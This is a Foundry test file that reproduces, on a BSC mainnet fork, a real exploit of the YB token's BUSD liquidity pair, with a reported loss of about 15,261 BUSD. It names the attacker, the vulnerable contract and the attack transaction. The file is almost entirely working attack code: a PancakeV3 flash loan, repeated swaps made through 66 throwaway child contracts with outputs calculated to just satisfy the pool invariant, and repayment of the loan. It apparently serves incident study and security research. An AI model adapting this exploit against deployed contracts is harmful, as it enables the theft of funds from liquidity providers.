// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 15261.68240413121964707 BUSD
// Original Attacker : https://bscscan.com/address/0x00000000b7da455fed1553c4639c4b29983d8538
// Attack Contract(Main) : https://bscscan.com/address/0xbdcd584ec7b767a58ad6a4c732542b026dceaa35
// Vulnerable Contract : https://bscscan.com/address/0x113F16A3341D32c4a38Ca207Ec6ab109cF63e434
// Attack Tx : https://bscscan.com/tx/0xe1e7fa81c3761e2698aa83e084f7dd4a1ff907bcfc4a612d54d92175d4e8a28b
// @POC Author : [rotcivegaf](https://twitter.com/rotcivegaf)

// Contracts involved
address constant pancakeV3Pool = 0x36696169C63e42cd08ce11f5deeBbCeBae652050;
address constant YB_BUSD_LP = 0x38231F8Eb79208192054BE60Cb5965e34668350A;
address constant BUSD = 0x55d398326f99059fF775485246999027B3197955;

address constant YB = 0x04227350eDA8Cb8b1cFb84c727906Cb3CcBff547;

contract YBToken_exp is Test {
    address attacker = makeAddr("attacker");

    function setUp() public {
        vm.createSelectFork("bsc", 48415276 - 1);
    }

    function testPoC() public {
        vm.startPrank(attacker);

        AttackerC attC = new AttackerC();
        
        attC.attack();

        console2.log("Profit:", IERC20(BUSD).balanceOf(attacker) / 1e18, 'BUSD');
    }
}

contract AttackerC {
    uint256 loanAmount = 19200000000000000000000; // Magic number
    uint256 swapLength = 66; // Magic number

    function attack() external payable {
        Uni_Pair_V3(pancakeV3Pool).flash(
            address(this),
            loanAmount,
            0,
            ''
        );

        uint256 balBUSD = IERC20(BUSD).balanceOf(address(this));
        IERC20(BUSD).transfer(msg.sender, balBUSD);
    }

    function pancakeV3FlashCallback(
        uint256 fee0,
        uint256 fee1,
        bytes calldata data
    ) external {
        for (uint i; i < swapLength; i++) {
            AttackerCChild child = new AttackerCChild();
            IERC20(BUSD).transfer(YB_BUSD_LP, loanAmount / swapLength);

            (uint112 reserve0, uint112 reserve1,) = IPancakePair(YB_BUSD_LP).getReserves();
            uint256 balance1 = IERC20(BUSD).balanceOf(YB_BUSD_LP);

            IPancakePair(YB_BUSD_LP).swap(
                getAmount0ToReachK(balance1, reserve0, reserve1),
                0,
                address(child),
                ''
            );

            IERC20(YB).transferFrom(
                address(child), 
                address(this), 
                IERC20(YB).balanceOf(address(child))
            );
        }

        uint256 balYB = IERC20(YB).balanceOf(address(this));

        for (uint i; i < swapLength; i++) {
            IERC20(YB).transfer(YB_BUSD_LP, balYB / swapLength);
            
            (uint112 reserve0, uint112 reserve1,) = IPancakePair(YB_BUSD_LP).getReserves();
            uint256 balance0 = IERC20(YB).balanceOf(YB_BUSD_LP);

            IPancakePair(YB_BUSD_LP).swap(
                0,
                getAmount1ToReachK(balance0, reserve0, reserve1),
                address(this),
                ''
            );           
        }

        uint256 balBUSD = IERC20(BUSD).balanceOf(address(this));

        IERC20(BUSD).transfer(pancakeV3Pool, loanAmount + fee0);
    }

    function getAmount0ToReachK(
        uint256 balance1, 
        uint256 reserve0, 
        uint256 reserve1
    ) internal pure returns(uint256 amount0Out) {
        uint256 K = reserve0 * reserve1 * 10000**2;
        uint256 step1 = balance1 * 10000 - (balance1 - reserve1) * 25;
        uint256 step2 = K / step1 / 10000;

        amount0Out = reserve0 - step2 - 1;
    }

    function getAmount1ToReachK(
        uint256 balance0, 
        uint256 reserve0, 
        uint256 reserve1
    ) internal pure returns(uint256 amount1Out) {
        uint256 K = reserve1 * reserve0 * 10000**2;

        uint256 step1 = balance0 * 10000 - (balance0 - reserve0) * 25;
        uint256 step2 = K / step1 / 10000;

        amount1Out = reserve1 - step2 - 1;
    }
}

contract AttackerCChild {
    constructor () {
        IERC20(YB).approve(msg.sender, type(uint256).max);
    }
}